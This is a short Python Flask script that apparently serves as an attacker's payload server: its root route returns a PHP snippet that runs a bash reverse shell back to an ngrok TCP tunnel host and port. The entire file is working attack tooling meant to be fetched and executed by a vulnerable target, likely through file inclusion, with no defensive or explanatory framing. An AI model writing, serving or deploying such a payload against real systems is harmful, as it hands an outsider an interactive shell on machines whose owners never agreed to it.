from flask import Flask, make_response

app = Flask(__name__)

NGROK_HOST = "0.tcp.eu.ngrok.io"
NGROK_PORT = 13000
INTERNAL_PORT = 1234

@app.route("/", methods=['GET'])
def index():
    code = '''<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");''' % (NGROK_HOST, NGROK_PORT)

    return make_response(code)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=INTERNAL_PORT)
